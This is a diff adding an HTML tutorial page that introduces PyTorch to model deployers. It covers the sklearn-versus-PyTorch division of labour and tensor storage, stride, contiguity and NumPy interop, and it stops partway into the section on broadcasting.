@@ -1,0 +1,2012 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>PyTorch Crash Course (Part 1): for people who deploy models but never learned the framework underneath</title>
+    <link rel="icon" href="../../favicon.ico" />
+    <link rel="stylesheet" href="../site.css" />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <header>
+      <a class="brand" href="../../index.html"
+        ><img src="../logo-wide-song.svg" alt="朗之文" width="84" height="32"
+      /></a>
+      <a href="../index.html"
+        ><img src="../../nav-home.svg" alt="文章首页" width="39" height="36"
+      /></a>
+    </header>
+    <main>
+      <header>
+        <h1>PyTorch Crash Course (Part 1): for people who <em>deploy</em> models but never learned the framework underneath</h1>
+        <p class="post-meta">
+          First published <time datetime="2026-10">October 2026</time>
+        </p>
+      </header>
+      <nav class="toc">
+        <details open>
+          <summary>Contents 目录</summary>
+          <ol>
+            <li>
+              <a href="#s1">Why not just read one of the PyTorch books</a>
+              <ol>
+                <li><a href="#s1-1">Reading map</a></li>
+              </ol>
+            </li>
+            <li><a href="#s2">0. One-sentence positioning</a></li>
+            <li>
+              <a href="#s3">0.5 What it doesn't do: the division of labor with sklearn</a>
+              <ol>
+                <li><a href="#s3-1">But sklearn also extracts features — the real difference is "who supplies the candidate space"</a></li>
+                <li><a href="#s3-2">Two common misconceptions</a></li>
+                <li><a href="#s3-3">And they're usually used together, not either/or</a></li>
+              </ol>
+            </li>
+            <li>
+              <a href="#s4">1. Tensor: the core data structure</a>
+              <ol>
+                <li><a href="#s4-1">Relationship to NumPy (zero-copy interop)</a></li>
+                <li><a href="#s4-2">The one shape concept worth understanding: contiguous / stride</a></li>
+                <li><a href="#s4-3">The third, implicit shape rule: broadcasting</a></li>
+              </ol>
+            </li>
+            <li>
+              <a href="#s5">2. Device: CPU / GPU and the thing you care about most — VRAM</a>
+              <ol>
+                <li><a href="#s5-1">Cross-device ops error out immediately</a></li>
+                <li><a href="#s5-2">CUDA is asynchronous (must-know for your benchmarking)</a></li>
+                <li><a href="#s5-3">VRAM: reserved vs allocated (explains the "numbers don't add up" you've seen)</a></li>
+              </ol>
+            </li>
+            <li>
+              <a href="#s6">3. dtype and precision: fp32 / fp16 / bf16 / int8</a>
+              <ol>
+                <li><a href="#s6-1">VRAM back-of-envelope: the full budget</a></li>
+              </ol>
+            </li>
+            <li>
+              <a href="#s7">4. Autograd: understand it mainly so you can <em>turn it off</em></a>
+              <ol>
+                <li><a href="#s7-1">autograd ≠ backpropagation (strictly speaking)</a></li>
+              </ol>
+            </li>
+            <li>
+              <a href="#s8">5. nn.Module: a model is just "a function that carries weights"</a>
+              <ol>
+                <li><a href="#s8-1">state_dict: this is what model files contain</a></li>
+                <li><a href="#s8-2">A real case: stripping a prefix — the strongest evidence that "keys are attribute paths"</a></li>
+                <li><a href="#s8-3">Dissecting <code>nn.Linear</code>: affine transform, <code>[out, in]</code>, and the fully-connected diagram</a></li>
+                <li><a href="#s8-4">Walking through with real numbers (same graph, now with actual values)</a></li>
+                <li><a href="#s8-5">What TinyNet actually does: look at the output end and the input end separately</a></li>
+                <li><a href="#s8-6">From "one Linear" to "a network": why there must be a ReLU in between</a></li>
+                <li><a href="#s8-7">How many hidden layers? — and taking apart the "three-layer network" naming trap</a></li>
+                <li><a href="#s8-8">Wrapping up: how this maps to real models</a></li>
+                <li><a href="#s8-9">Appendix One: TinyNet touches only two things — what else is in the <code>torch.nn</code> cabinet</a></li>
+                <li><a href="#s8-10">Appendix Two (skippable): that <code>.T</code>, column vectors, and what the "batch dimension" really is</a></li>
+              </ol>
+            </li>
+            <li><a href="#s9">6. One complete forward pass: putting the above together</a></li>
+            <li>
+              <a href="#s10">7. What a model looks like on disk: the full picture of the files in a repo</a>
+              <ol>
+                <li><a href="#s10-1">Shards: why the directory doesn't have one <code>model.safetensors</code></a></li>
+                <li><a href="#s10-2"><code>architectures</code>: deciding which code loads the model</a></li>
+                <li><a href="#s10-3">What's actually in the state_dict</a></li>
+                <li><a href="#s10-4"><code>.bin</code> vs <code>.safetensors</code>: same content, different format</a></li>
+                <li><a href="#s10-5">Going deeper: the problem with pickle in PyTorch</a></li>
+                <li><a href="#s10-6">A hard limit of safetensors: it can't hold "two names pointing to the same storage"</a></li>
+                <li><a href="#s10-7">Inspect it yourself (empirical)</a></li>
+                <li><a href="#s10-8">An aside: what a checkpoint actually is</a></li>
+                <li><a href="#s10-9">Training format ≠ inference format: why some weights need converting first</a></li>
+              </ol>
+            </li>
+            <li><a href="#s11">8. transformers: the layer that lifts PyTorch into "models"</a></li>
+            <li><a href="#s12">9. Debugging / troubleshooting table</a></li>
+            <li><a href="#s13">10. A 30-minute hands-on checklist (verify you really got it)</a></li>
+            <li><a href="#s14">11. Mental model summary (one page to take away)</a></li>
+            <li>
+              <a href="#s15">Appendix: Structure (inductive bias) — the layer that really explains deep learning</a>
+              <ol>
+                <li><a href="#s15-1">1 "It's all matmul" is right, but that's the mechanism, not the explanation</a></li>
+                <li><a href="#s15-2">2 Expressive power vs learnability (the real reason structure matters)</a></li>
+                <li><a href="#s15-3">3 Case study: what exactly goes wrong when MNIST flattens 28×28 into 784</a></li>
+                <li><a href="#s15-4">4 Position information: what MLPs, CNNs and Transformers each lack, and how each makes up for it</a></li>
+                <li><a href="#s15-5">5 What it means for you (as a deployer / model selector)</a></li>
+              </ol>
+            </li>
+          </ol>
+        </details>
+      </nav>
+      <article>
+        <blockquote>
+        <p><strong>Audience</strong>: you already run vLLM / ASR model / TTS model, you know Python cold, but you've never sat down with PyTorch itself.<br />
+        <strong>Goal</strong>: understand the layer your inference stack stands on — enough to read it, debug it, and tune it. Not to learn how to train models from scratch.<br />
+        <strong>Scope of this part</strong>: only <strong>PyTorch itself + what a model is on disk</strong>. The engine-layer matters — vLLM / Xinference / ASR / TTS — are in <strong>Part 2</strong>.<br />
+        <strong>One rule for the whole document</strong>: training-side material appears only when it explains some inference-side phenomenon or decision. You won't read about <code>optimizer.step()</code> here.<br />
+        <strong>Test environment</strong>: anything marked "measured" was run on torch 2.13 / transformers 5.14.1 (version numbers scattered through the text refer to these two; the <code>fit()</code> check in §0.5, <code>torch.int4</code> in §3, and the shard default and <code>total_size</code> in §7 were checked on torch 2.14 / transformers 5.17 / huggingface_hub 1.31). APIs move; treat these as the baseline when you re-verify later.</p>
+        </blockquote>
+        <h2 id="s1">Why not just read one of the PyTorch books</h2>
+        <p>Because almost all of them answer <strong>a different question</strong>: how to build a model from scratch and train it.</p>
+        <p>Take the most representative one, Manning's <em>Deep Learning with PyTorch</em> (first edition 2020, second edition 2026 adding transformers and generative models). Its skeleton is: <strong>introduce tensors → turn real data into tensors → the mechanics of learning (gradient descent) → build a network → convolutions → a six-chapter end-to-end training project (lung-CT nodule detection) → one final chapter on deployment</strong>. The official tutorial <a href="https://docs.pytorch.org/tutorials/beginner/nn_tutorial.html">What is torch.nn really?</a> points the same way: hand-write a working network with bare tensors, then swap in <code>nn.Module</code> / <code>optim</code> / <code>DataLoader</code> one at a time so you see what hand-written code each abstraction replaces.</p>
+        <p><strong>They're all well written; the problem is where they land</strong> — the destination is <code>loss.backward()</code> and <code>optimizer.step()</code>, i.e. "train a model". You already have Qwen3, SenseVoice, F5-TTS that someone else trained; your questions are <strong>what is this model on disk, how do I compute VRAM, why does this traceback say view is incompatible, why doesn't throughput rise when I add concurrency</strong>. The two lines barely intersect, which is why those books start to feel irrelevant by chapter three — <strong>that's not a willpower problem.</strong></p>
+        <p>There's a practical issue too: the one deployment-related chapter in such books is usually <strong>the chapter that goes stale fastest</strong> (the 2020 edition covers Flask + TorchScript + ONNX; TorchScript is now on a deprecation path, and the HuggingFace ecosystem and vLLM didn't exist yet).</p>
+        <p><strong>One exception worth noting up front</strong>: the day you need to fine-tune a model (say, LoRA on Qwen), that half of the book suddenly becomes relevant — because then you are <strong>updating weights</strong>, and the whole autograd machinery comes back (§4 gives this criterion). Until then, that line can wait.</p>
+        <h3 id="s1-1">Reading map</h3>
+        <p>Read in order and the line closes on itself: <strong>tensor layer → model layer → run one forward → what this model is on disk</strong>.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Section</th>
+        <th>What question it answers</th>
+        <th></th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><strong>§0.5 Division of labor with sklearn</strong></td>
+        <td>When should I use PyTorch, and when is sklearn enough?</td>
+        <td>required</td>
+        </tr>
+        <tr>
+        <td><strong>§1 Tensor</strong></td>
+        <td>What is a tensor, really? Why <code>view size is not compatible</code>? Why does broadcasting not error when it's wrong?</td>
+        <td>required</td>
+        </tr>
+        <tr>
+        <td><strong>§2 Device</strong></td>
+        <td>Why doesn't <code>nvidia-smi</code> match my arithmetic? Why must timing use <code>synchronize</code>?</td>
+        <td>required</td>
+        </tr>
+        <tr>
+        <td><strong>§3 dtype</strong></td>
+        <td>What's the difference between bf16 and fp16? Will this model fit on my card?</td>
+        <td>required</td>
+        </tr>
+        <tr>
+        <td><strong>§4 Autograd</strong></td>
+        <td>Why does inference use so much less VRAM than training? What do <code>eval()</code> and <code>inference_mode()</code> each control?</td>
+        <td>required</td>
+        </tr>
+        <tr>
+        <td><strong>§5 nn.Module</strong></td>
+        <td>Where do keys like <code>model.layers.0.self_attn.q_proj.weight</code> come from? Would one more hidden layer help?</td>
+        <td>required</td>
+        </tr>
+        <tr>
+        <td>└ Appendix One</td>
+        <td>What else is in <code>torch.nn</code>? Why won't some tensors move with <code>.to("cuda")</code>?</td>
+        <td>recommended</td>
+        </tr>
+        <tr>
+        <td>└ Appendix Two</td>
+        <td>Where does the <code>.T</code> in <code>x @ W.T</code> come from?</td>
+        <td><strong>skippable</strong></td>
+        </tr>
+        <tr>
+        <td><strong>§6 One forward pass</strong></td>
+        <td>Put the first five sections together: what hand-written inference looks like</td>
+        <td>required</td>
+        </tr>
+        <tr>
+        <td><strong>§7 Model files</strong></td>
+        <td>What does each file in the directory I downloaded do? <code>.safetensors</code> vs <code>.pt</code>?</td>
+        <td>required</td>
+        </tr>
+        <tr>
+        <td><strong>§8 transformers</strong></td>
+        <td>With PyTorch in hand, why transformers? What exactly does it add?</td>
+        <td>required</td>
+        </tr>
+        <tr>
+        <td><strong>§9 Troubleshooting table</strong></td>
+        <td>What to check first when something errors</td>
+        <td>lookup</td>
+        </tr>
+        <tr>
+        <td><strong>§10 Hands-on checklist</strong></td>
+        <td>30 minutes to verify you actually got it</td>
+        <td>hands-on</td>
+        </tr>
+        <tr>
+        <td><strong>§11 Mental model</strong></td>
+        <td>One page to take away</td>
+        <td>wrap-up</td>
+        </tr>
+        <tr>
+        <td>Appendix</td>
+        <td>What's wrong with "it's all just matmul"? Does structure matter? (includes a controlled experiment that needs no download and runs in seconds)</td>
+        <td>optional</td>
+        </tr>
+        </tbody>
+        </table>
+        <p><strong>First read</strong>: skip Appendix Two and the appendix at the end; read the rest in order. <strong>Coming back to look something up</strong>: go straight to the §9 table — every entry points back to its section.</p>
+        <hr />
+        <h2 id="s2">0. One-sentence positioning</h2>
+        <p>PyTorch = <strong>NumPy + GPU + automatic differentiation (autograd) + a standard container for models/weights (<code>nn.Module</code>)</strong>.</p>
+        <p>When you do inference, the autograd half is basically switched off. What you actually deal with every day is the first three: <strong>tensors, device, dtype, memory</strong>. So that's where this guide spends its weight.</p>
+        <p>Analogies to things you already know:</p>
+        <ul>
+        <li><code>torch.Tensor</code> ≈ the <code>numpy.ndarray</code> you use in audio / signal processing, plus two extra attributes: <code>.device</code> and <code>.requires_grad</code>.</li>
+        <li><code>nn.Module</code> ≈ a "callable object that carries weights"; its <code>state_dict</code> is its entire set of weights (literally what lives inside a <code>.safetensors</code> file).</li>
+        <li>vLLM / F5-TTS / FunASR ≈ networks someone built out of <code>nn.Module</code> plus a serving/scheduling layer. PyTorch is their shared substrate.</li>
+        </ul>
+        <hr />
+        <h2 id="s3">0.5 What it doesn't do: the division of labor with sklearn</h2>
+        <p>Let's settle where sklearn and PyTorch each apply first, so the nagging question "then what was the sklearn I used all this time?" doesn't keep coming back.</p>
+        <p><strong>The simplest test is what your data looks like:</strong></p>
+        <blockquote>
+        <p><strong>A table</strong> (rows = samples, columns = named quantities: age, amount, frequency) → <strong>sklearn</strong><br />
+        <strong>A pile of audio / text / image files</strong> → <strong>PyTorch</strong></p>
+        </blockquote>
+        <p>(That's the beginner's rule of thumb — good enough, not precise. An <code>[N, 1024]</code> matrix of vectors is also "a table"; its columns have no names, and sklearn works on it fine — the end of this section does exactly that. The real criterion is in the paragraph below on "who supplies the candidate space".)</p>
+        <table>
+        <thead>
+        <tr>
+        <th></th>
+        <th><strong>sklearn</strong> (and tree libraries with the same interface)</th>
+        <th><strong>PyTorch</strong></th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td>Data shape</td>
+        <td><strong>Tabular</strong>: columns are features with existing meaning</td>
+        <td><strong>Unstructured</strong>: no ready-made "features" in the raw signal</td>
+        </tr>
+        <tr>
+        <td>Data volume</td>
+        <td>Works well from hundreds to hundreds of thousands of rows</td>
+        <td>Training from scratch needs far more; but <strong>this doesn't hold with pretrained models</strong> (see below)</td>
+        </tr>
+        <tr>
+        <td>Typical algorithms</td>
+        <td>Logistic regression, SVM, random forest, gradient-boosted trees, k-means, PCA</td>
+        <td>Neural networks of any structure</td>
+        </tr>
+        <tr>
+        <td>Interface</td>
+        <td><code>fit(X, y)</code> in one line; the training loop is hidden</td>
+        <td><strong>The core</strong> makes you write the training loop, loss and optimizer yourself — but that's only the core, see the second note under the table</td>
+        </tr>
+        <tr>
+        <td>Hardware</td>
+        <td>Single-machine CPU; data must fit in memory</td>
+        <td>GPU / multi-GPU / streaming</td>
+        </tr>
+        <tr>
+        <td>How a model is stored</td>
+        <td><code>joblib</code> / <code>pickle</code> (the same thing as §7's <code>.bin</code>, with the same security and versioning problems)</td>
+        <td><code>state_dict</code> → safetensors (§7)</td>
+        </tr>
+        </tbody>
+        </table>
+        <blockquote>
+        <p>The parenthetical in the header, "tree libraries with the same interface", needs one sentence: <strong>XGBoost / LightGBM / CatBoost are not sklearn.</strong> They're independent libraries that merely offer an sklearn-style <code>fit / predict</code> interface; sklearn's own gradient-boosted tree is <code>HistGradientBoostingClassifier</code>. The distinction has a practical consequence — XGBoost / LightGBM <strong>support GPU training</strong>, so "single-machine CPU" in the hardware row is true only of sklearn proper.</p>
+        </blockquote>
+        <blockquote>
+        <p>One more, so the "interface" row isn't mistaken for the dividing line: <strong>"does it have <code>fit()</code>" is not what separates the two.</strong> torch proper really doesn't have one — <code>hasattr(torch, "fit")</code> and <code>hasattr(nn.Module, "fit")</code> are both <code>False</code> on 2.14 — but the wrapper layers hand you <code>fit()</code> anyway: <strong>skorch</strong>'s entire selling point is disguising a PyTorch model as an sklearn estimator (<code>NeuralNetClassifier(...).fit(X, y)</code>, which you can drop straight into <code>GridSearchCV</code> and <code>Pipeline</code>); <strong>PyTorch Lightning</strong> is <code>Trainer.fit(model, dataloader)</code>; <strong>fastai</strong> is <code>learn.fit_one_cycle(...)</code>. <strong>What an API looks like can be wrapped any way you like</strong>; the real dividing line is in the next subsection.</p>
+        </blockquote>
+        <p>A transaction's amount, geo-distance and frequency are already three named numbers — <strong>feed them to a random forest and you're done, no neural network needed</strong>. An email, a voice clip, an image are not naturally "a few features".</p>
+        <h3 id="s3-1">But sklearn also extracts features — the real difference is "who supplies the candidate space"</h3>
+        <p>That rule of thumb is easily misread as "sklearn can only eat ready-made features". <strong>It can't be.</strong> "Extracting features" comes in three tiers, split by who supplies the candidate space, and sklearn owns the first two:</p>
+        <p><strong>Tier 1: humans supply the candidates and humans pick.</strong> This is <strong>feature engineering</strong> in the classic sense: people design features from their understanding of the business — amount / geo-distance / frequency in fraud control — then standardize, bin, build cross terms. Images and text can be done this way too, and historically were: <strong>SIFT + SVM for vision, TF-IDF + logistic regression for text</strong> (SIFT is a human-designed local image descriptor; TF-IDF is a text vector weighted by "term frequency × rarity"). That was the mainstream before deep learning.</p>
+        <p><strong>Tier 2: the candidates are given; the algorithm picks, weights and combines within them.</strong> With many tables you have no idea which columns matter — a mass spectrometer gives you thousands of m/z channels, a proteomics run gives thousands of proteins, and you have a few dozen samples. The columns come from the instrument; nobody knows which ones are meaningful, or even whether "the meaningful thing" is a few columns or a combination of them. Here sklearn is doing the feature-finding: <code>SelectKBest</code> screens columns by a statistic, L1 logistic regression drives irrelevant coefficients to zero, random forests report importances, PCA squeezes thousands of columns into a few components. <strong>All of this is "the algorithm extracting features from data", not a human thinking them up.</strong> But note the limits of what it can do: select a subset of columns, weight columns, take linear combinations of columns, split on column thresholds — <strong>the result is always a function of these columns; it never leaves the candidate space that the table's columns define.</strong> And the human prior hasn't disappeared, it has changed form: L1 is the assumption "only a few columns matter", a linear model is the assumption "additive", a tree is the assumption "piecewise constant" — choosing the model and tuning the penalty <em>is</em> supplying that prior.</p>
+        <p><strong>Tier 3: the network constructs the candidate space itself.</strong> On pixels and waveforms there are no "columns" to pick — a single pixel or a single sample means nothing to the task. Each layer of the network generates representations the previous layer didn't have (edges → textures → parts → objects), and the direction of that generation is decided by <strong>the task's gradient</strong>. Humans supply only a structural prior (convolutions for images, attention for sequences — the appendix at the end covers this); the representation trains itself.</p>
+        <p><strong>Put another way, judged on three properties, every Tier 2 method is missing at least one:</strong></p>
+        <table>
+        <thead>
+        <tr>
+        <th></th>
+        <th>Can it create new coordinate directions?</th>
+        <th>Are the directions decided by the task?</th>
+        <th>Can the representation it builds be stacked further?</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td>Standardization, binning</td>
+        <td>❌ No — per-column transforms, each column scaled / discretized on its own; no combinations of columns</td>
+        <td>❌</td>
+        <td>❌</td>
+        </tr>
+        <tr>
+        <td>PCA (and ICA, NMF and similar dimensionality reduction)</td>
+        <td>✅ Yes (a linear combination of columns is a new direction)</td>
+        <td>❌ No — PCA only looks for the direction of maximum variance; labels never enter</td>
+        <td>❌</td>
+        </tr>
+        <tr>
+        <td><code>SelectKBest</code>, tree importances, gradient-boosted trees</td>
+        <td>❌ No — they only select along, or split on, the existing axes; what they build is at most rectangles bounded by those axes</td>
+        <td>✅ Yes</td>
+        <td>❌</td>
+        </tr>
+        <tr>
+        <td>Logistic regression, linear SVM, LDA, PLS (L1 variants included)</td>
+        <td>✅ Yes — the decision function <code>w·x</code> is itself a new direction</td>
+        <td>✅ Yes</td>
+        <td>❌ <strong>Only this one layer</strong>: that direction is the final output; there's no intermediate representation to hand to a next layer</td>
+        </tr>
+        <tr>
+        <td><strong>Neural network</strong></td>
+        <td>✅ Yes</td>
+        <td>✅ Yes</td>
+        <td>✅ One layer's representation feeds the next, with a nonlinearity in between, so stacking doesn't collapse</td>
+        </tr>
+        </tbody>
+        </table>
+        <p><strong>What makes Tier 3 special is that all three hold at once, and the third is the key.</strong> A linear classifier satisfies the first two — the <code>w</code> it learns is a new direction decided by the task — but it has only one layer; the direction it builds is directly the answer, and nothing stacks on top. <strong>A linear classifier is a one-layer neural network; §5 will show that stacking linear layers alone is no stacking at all (two Linears with no ReLU between them collapse into one) — so "can it stack" and "does it collapse when stacked" are the same question, and nonlinearity is the entry ticket to Tier 3.</strong></p>
+        <p>This also explains, in passing, why gradient-boosted trees aren't Tier 3: each tree's split is indeed chosen against the current loss — <strong>entirely task-driven</strong> — but the only question it can ever ask is "is column 37 greater than 0.8?" — <strong>the coordinate system came from the instrument; it can only cut along it.</strong></p>
+        <p><strong>So the dividing line is: the first two tiers search within "the given columns"; the third tier manufactures the "columns" themselves.</strong> A table's columns already carry meaning ("geo-distance" and its relation to fraud is clear to a person; human priors are valuable), or are at least a meaningful unit of measurement (one gene's expression level), so searching among the columns is enough, and feature engineering plus tree models remain very effective. Pixels and waveforms carry no ready-made meaning; <strong>people can't think up good enough features and there are no columns to pick from</strong>, so "let the network build its own" won decisively.</p>
+        <blockquote>
+        <p>(Mechanically this is autograd's doing: in deep learning the loss's gradient flows all the way back to <strong>the earliest layers</strong>, so "what features the front should extract" is twisted into shape by the task at the back, one layer twisting the next. sklearn's Tier 2 also learns from data, but what it learns is <strong>how to pick and cut within given coordinates</strong>, not the coordinates themselves. §4 covers the mechanism.)</p>
+        </blockquote>
+        <h3 id="s3-2">Two common misconceptions</h3>
+        <ol>
+        <li><strong>The sklearn ecosystem is not "an outdated PyTorch".</strong> On <strong>tabular data</strong>, gradient-boosted trees like XGBoost / LightGBM still routinely <strong>beat neural networks</strong>. For risk control, churn prediction and the like, deep learning is often not worth it.</li>
+        <li><strong>sklearn's <code>MLPClassifier</code> is for teaching / baselines</strong> — no GPU, no custom architecture. For real neural networks, switch to PyTorch.</li>
+        </ol>
+        <h3 id="s3-3">And they're usually used together, not either/or</h3>
+        <p><strong>First, the nature of these three points: they're the common division of labor between the two libraries in practice, not my own measurements.</strong> The experiment in the appendix at the end is a live example of the first one (sklearn fetches data and computes metrics, PyTorch builds the model); the other two are "good to know it exists".</p>
+        <ul>
+        <li><strong>Preprocessing and evaluation</strong>: <code>StandardScaler</code>, <code>train_test_split</code>, <code>classification_report</code>, <code>confusion_matrix</code>, <code>roc_auc_score</code> — <strong>PyTorch proper provides no metric computation</strong> (there's a separate <code>torchmetrics</code> package, but for classification / regression / clustering metrics everyone just uses sklearn). <strong>Note that sklearn covers only those categories</strong>: ASR character / word error rate (CER / WER) needs a library like <code>jiwer</code>, TTS has no ready-made objective metric, LLM evaluation is a separate world — don't expect sklearn to cover the metrics on your stack.</li>
+        <li><strong>Analyzing vectors</strong>: a text-encoding model (PyTorch) produces a pile of vectors → sklearn does clustering, PCA, visualization to check the data distribution makes sense. (The handoff is in §1: sklearn only accepts numpy on CPU; tensors must go through <code>.cpu().numpy()</code> first.)</li>
+        <li><strong>Where the "data volume" exception in the table comes from</strong>: a common practice is encoder outputs vectors (PyTorch) → an sklearn logistic regression as the head. A few hundred samples suffice because <strong>the encoder was already trained on massive data</strong>; you're only training the last layer. This is written here not as a recommendation but to make one point directly relevant to you: <strong>"deep learning needs big data" is about training from scratch; it doesn't apply when you use someone else's trained weights.</strong> (The "backbone + a head on the end" structure is explained fully in §5.)</li>
+        </ul>
+        <p><strong>On your stack</strong>: LLM, ASR, TTS, embedding, rerank — <strong>all unstructured data; the main line is PyTorch throughout</strong>. sklearn is a helper for you: computing metrics, analyzing vectors, running small-scale comparisons. The experiment in the appendix at the end is a live example of this split — <strong>sklearn fetches the data, PyTorch builds the model.</strong></p>
+        <p><strong>Finally, for a deployer this choice has already been made for you.</strong> The above is "I have data, which should I choose"; your actual situation is running <strong>weights someone else trained</strong> — Qwen / FunASR / F5-TTS — and the model author wrote them in PyTorch, so you run them in PyTorch, regardless of the input's shape. Everything after this point in the document is built on that situation.</p>
+        <blockquote>
+        <p><strong>A preview: the TinyNet example in the next section runs head-on into this criterion</strong> — three numeric features, binary classification; by the standard above it should be sklearn. That's not a badly chosen example; §5 says so explicitly.</p>
+        </blockquote>
+        <hr />
+        <h2 id="s4">1. Tensor: the core data structure</h2>
+        <p><strong>The most fundamental sentence: a tensor = a flat 1D block of memory (a Storage) + metadata (shape + stride) telling PyTorch how to read that block as N-D.</strong> No matter how many dimensions you design, physical memory is always a straight line — hardware memory is linearly addressed; there's no such thing as "2D memory." Dimensionality is purely an interpretation layer.</p>
+        <p>PyTorch makes this explicit as two layers:</p>
+        <ul>
+        <li><strong>Storage</strong>: the flat 1D buffer that actually holds the data (<code>t.untyped_storage()</code> shows it).</li>
+        <li><strong>Tensor</strong> = a <strong>view</strong>: <code>storage + (shape, stride, storage_offset, dtype)</code>.</li>
+        </ul>
+        <p>This model is the foundation: <strong>multiple Tensors can be different views over the same Storage</strong> — that one fact explains every "zero-copy vs copy" behavior below (see the stride subsection).</p>
+        <p>The <strong>metadata</strong> a tensor carries — these attributes are the ones you'll inspect constantly when debugging:</p>
+        <pre class="python"><code>import torch
+
+x = torch.randn(2, 3)            # 2x3 random tensor, float32 by default, on CPU
+print(x.shape)                   # torch.Size([2, 3])   — shape
+print(x.dtype)                   # torch.float32         — data type
+print(x.device)                  # cpu                   — which device it&#39;s on
+print(x.requires_grad)           # False                 — whether to build a graph
+</code></pre>
+        <h3 id="s4-1">Relationship to NumPy (zero-copy interop)</h3>
+        <pre class="python"><code>import numpy as np
+a = np.array([1.0, 2.0, 3.0])
+t = torch.from_numpy(a)          # shares memory! mutating t mutates a (CPU only)
+back = t.numpy()                 # also shared
+</code></pre>
+        <p>On CPU, <code>from_numpy</code> / <code>.numpy()</code> are <strong>zero-copy</strong> (they share the same buffer). Keep this in mind during pre/post-processing (ASR audio PCM, TTS output waveforms): changing one changes the other. Once a tensor is on the GPU, <code>.numpy()</code> errors out — you must <code>.cpu()</code> first. And if the tensor still carries a gradient (<code>requires_grad=True</code>, e.g. a model output obtained outside <code>inference_mode</code>), <code>.numpy()</code> also errors with <code>Can't call numpy() on Tensor that requires grad</code> — <code>.detach()</code> first (§4).</p>
+        <p><strong>A trap you will hit on the audio side: numpy defaults to float64, torch defaults to float32.</strong> The waveform from <code>soundfile.read</code> is float64, and <code>torch.from_numpy</code> <strong>faithfully</strong> hands you a float64 tensor — feed that into a float32 / bf16 model and you get the <code>dtype mismatch</code> in §9 ②. And int16 PCM needs <code>/ 32768.0</code> normalization first. So before handing numpy data to a model, make a habit of adding <code>.float()</code> (or <code>.to(model_dtype)</code>):</p>
+        <pre class="python"><code>wav, sr = soundfile.read(&quot;a.wav&quot;)            # wav.dtype == float64
+x = torch.from_numpy(wav).float()             # → float32; this step is no longer zero-copy (changing dtype must copy)
+</code></pre>
+        <h3 id="s4-2">The one shape concept worth understanding: contiguous / stride</h3>
+        <p><strong>stride = for each dimension, "to step one index, jump how many elements in the flat memory."</strong> Example, a 2×3, row-major (C-contiguous):</p>
+        <pre><code>memory: [a, b, c, d, e, f]      (flat)
+shape  = (2, 3) # laid out as:
+                  [a,b,c
+                   d,e,f]
+
+stride = (3, 1)   ← move 1 row → jump 3 elements [a -&gt; d]; move 1 col → jump 1 [a -&gt; b]
+element [i,j] at flat offset = i*stride[0] + j*stride[1] = i*3 + j
+</code></pre>
+        <p><strong>transpose only swaps the stride, moves no data:</strong></p>
+        <pre><code>x:     shape (2,3), stride (3,1), memory [a,b,c,d,e,f]
+x.t(): shape (3,2), stride (1,3)   ← same memory, only the stride changed!
+# x.t() laid out as:
+
+[a,d
+ b,e
+ c,f]
+move 1 row → jump 1 [a -&gt; b]; move 1 col → jump 3 [a -&gt; d]  — all relative to the flat memory [a,b,c,d,e,f]
+</code></pre>
+        <p>Now <code>x.t()</code>'s <code>[i,j]</code> = flat offset <code>i*1 + j*3</code>, reading <code>[0,0]=a, [0,1]=d, [1,0]=b…</code> — exactly the transpose, achieved purely by "reading differently," <strong>zero-copy, O(1)</strong>. The cost: <code>x.t()</code> is now <strong>non-contiguous</strong> (<code>is_contiguous()</code> = False), because its memory order no longer matches row-major reading (i.e. <strong>elements within the same row are contiguous in memory</strong>).</p>
+        <pre class="python"><code>x = torch.randn(2, 3)
+y = x.t()                        # transpose — only swaps stride, no data moved; y non-contiguous
+print(y.is_contiguous())         # False
+z = y.contiguous()               # THIS step actually copies into a new contiguous Storage
+</code></pre>
+        <p><strong>This is where view's constraint and use cases come in:</strong></p>
+        <ul>
+        <li><code>view()</code> <strong>just reinterprets the same Storage with a new shape — no data moved</strong>, so it requires the memory layout to already read contiguously under the new shape. Calling <code>view()</code> on a non-contiguous tensor (e.g. after transpose) errors: <code>view size is not compatible ... stride</code>.</li>
+        <li><code>reshape()</code> = "view if possible, else <code>contiguous()</code>-copy then view" — safer; <code>view()</code> is stricter but guarantees zero-copy.</li>
+        <li><code>contiguous()</code> forces a <strong>copy into a new row-major Storage</strong>, after which view works. Common combo: <code>x.transpose(...).contiguous().view(...)</code>.</li>
+        </ul>
+        <p><strong>Typical view use cases:</strong> flattening (<code>x.view(B, -1)</code>, like MNIST / TinyConv's <code>flatten(1)</code>); splitting heads in attention (<code>x.view(B, seq, n_heads, head_dim)</code> carves the hidden dim into heads); merging dims.</p>
+        <p>This also confirms §1's opening Storage model: <strong><code>from_numpy</code>/<code>.numpy()</code> zero-copy on CPU = sharing one Storage; <code>.contiguous()</code> copies = new Storage; transpose/view/slice zero-copy = same Storage, new metadata.</strong> Why you care: many CUDA kernels (attention included) require contiguous input; a <code>view size is not compatible</code> in a traceback is usually a missing <code>contiguous()</code> after a transpose/permute.</p>
+        <h3 id="s4-3">The third, implicit shape rule: broadcasting</h3>
+        <p>transpose / view / contiguous above are about <strong>how one tensor can be read differently</strong>. Broadcasting is about something else: <strong>how two tensors of different shapes do an elementwise operation</strong> — and its implementation turns out to be the very same Storage + stride model.</p>
+        <p><strong>Elementwise ops (<code>+ - * /</code>, comparisons) nominally require both sides to have exactly the same shape.</strong> <code>[2,4] + [2,4]</code> is fine; <code>[2,4] + [4]</code> shouldn't be. But in practice you constantly want to apply "a small thing" to "a pile of things":</p>
+        <ul>
+        <li>a scalar to a whole tensor: <code>wav / 32768.0</code> (PCM normalization)</li>
+        <li>a row of numbers to <strong>every row</strong>: add the same bias b to every sample in the batch</li>
+        <li>a column of numbers to <strong>every column</strong>: divide every sample in the batch by <strong>its own</strong> norm</li>
+        </ul>
+        <p>Without broadcasting you'd have to manually copy the small one up to the big one's shape before computing. <strong>Broadcasting = doing that for you, without actually copying memory.</strong></p>
+        <p><strong>You've already used it.</strong> The batched forward in §5:</p>
+        <pre class="python"><code>H = [[2,5,1,2],
+     [1,1,1,1]]           # [batch=2, in=4]
+H @ W2.T + b2             # b2 is [out] — one-dimensional
+</code></pre>
